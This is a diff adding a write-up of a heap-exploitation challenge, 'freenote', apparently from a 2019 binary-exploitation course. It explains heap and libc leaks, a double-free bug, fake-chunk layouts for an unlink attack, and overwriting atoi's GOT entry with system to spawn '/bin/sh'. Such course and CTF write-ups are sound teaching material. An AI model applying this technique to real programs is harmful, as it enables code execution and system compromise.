@@ -1,0 +1,71 @@
+# Solution to freenote bin-course-2019 #
+
+The newNote function is written in such a way that we are always returned a chunk of a size that is a multiples of 0x80. So, we get the same chunk whether we malloc 0x1 or 0x80.
+
+Generated a heap leak and a libc leak by mallocing, freeing and then mallocing again.
+After freeing a chunk, the first 0x10 bytes of the data part of the chunk now contain a forward pointer and a backward pointer. 
+When we malloc again, we can prevent overwriting these addresses by using less number of bytes, since the call to malloc will still be malloc(0x80)
+
+The libc leak will be the pointer to the unsorted bin in the main_arena.
+The heap leak will be the address of a previously freed chunk. 
+(We need a heap address leak since the array of pointers returned by malloc is stored on the heap. The address of this array of pointers is required to proceed with an unlink exploit)
+
+The array pointers is as follows.
+0x2054010:	0x0000000000000100	0x0000000000000007
+0x2054020:	0x0000000000000001	0x0000000000000008
+0x2054030:	0x0000000002055830	0x0000000000000001
+0x2054040:	0x0000000000000008	0x00000000020558c0
+0x2054050:	0x0000000000000001	0x0000000000000008
+0x2054060:	0x0000000002055950	0x0000000000000001
+0x2054070:	0x0000000000000008	0x00000000020559e0
+0x2054080:	0x0000000000000001	0x0000000000000008
+0x2054090:	0x0000000002055a70	0x0000000000000001
+0x20540a0:	0x0000000000000008	0x0000000002055b00
+0x20540b0:	0x0000000000000000	0x0000000000000000
+0x20540c0:	0x0000000002055b90	0x0000000000000001
+0x20540d0:	0x0000000000000008	0x0000000002055c20
+
+The first 8 bytes are the maximum number of pointers allowed. After that is the number of pointers in the array at the moment. 
+Then before each pointer is its size and before that is a boolean variable which is set to 0x1 when it is allocated and set to 0x0 when it is freed.
+
+The vulnerability to be exploited next is the fact that the deleteNote function does not check the bool variable before deleting which gives us a double free bug.
+
+So, allocating two adjacent chunks and then freeing them. We have two pointers added to the array of pointers.
+Allocating another chunk of a size larger than or equal to the size of both chunks, we will be returned a pointer to the upper chunk of the two previously allocated chunks.
+
+Then we can create fake chunks as follows.
+0x2055b80:	0x0000000000000000	0x0000000000000191 -----------> Pointer on the array
+---------------fake-chunk-------------------------
+0x2055b90:	0x0000000000000000	0x0000000000000000
+0x2055ba0:	0x00000000020540a8	0x00000000020540b0
+0x2055bb0:	0x6c6c6c6c6c6c6c6c	0x6c6c6c6c6c6c6c6c
+0x2055bc0:	0x6c6c6c6c6c6c6c6c	0x6c6c6c6c6c6c6c6c
+0x2055bd0:	0x6c6c6c6c6c6c6c6c	0x6c6c6c6c6c6c6c6c
+0x2055be0:	0x6c6c6c6c6c6c6c6c	0x6c6c6c6c6c6c6c6c
+0x2055bf0:	0x6c6c6c6c6c6c6c6c	0x6c6c6c6c6c6c6c6c
+0x2055c00:	0x6c6c6c6c6c6c6c6c	0x6c6c6c6c6c6c6c6c
+---------------fake-chunk-------------------------
+0x2055c10:	0x0000000000000080	0x0000000000000090 -----------> Pointer on the array
+0x2055c20:	0x6b6b6b6b6b6b6b6b	0x6b6b6b6b6b6b6b6b
+0x2055c30:	0x6b6b6b6b6b6b6b6b	0x6b6b6b6b6b6b6b6b
+0x2055c40:	0x6b6b6b6b6b6b6b6b	0x6b6b6b6b6b6b6b6b
+0x2055c50:	0x6b6b6b6b6b6b6b6b	0x6b6b6b6b6b6b6b6b
+0x2055c60:	0x6b6b6b6b6b6b6b6b	0x6b6b6b6b6b6b6b6b
+0x2055c70:	0x6b6b6b6b6b6b6b6b	0x6b6b6b6b6b6b6b6b
+0x2055c80:	0x6b6b6b6b6b6b6b6b	0x6b6b6b6b6b6b6b6b
+0x2055c90:	0x6b6b6b6b6b6b6b6b	0x6b6b6b6b6b6b6b6b
+---------------fake-chunk-------------------------
+0x2055ca0:	0x0000000000000090	0x0000000000000071
+0x2055cb0:	0x0000000000000000	0x0000000000000000
+0x2055cc0:	0x0000000000000000	0x0000000000000000
+0x2055cd0:	0x0000000000000000	0x0000000000000000
+0x2055ce0:	0x0000000000000000	0x0000000000000000
+0x2055cf0:	0x0000000000000000	0x0000000000000000
+0x2055d00:	0x0000000000000000	0x0000000000000000
+
+
+Freeing the second pointer, we get an address of the array of pointers on the array of pointers.
+After this, the problem is pretty straightforward, since we have an arbritrary write.
+
+Overwrite GOT entry of atoi with system
+Give input '/bin/sh'
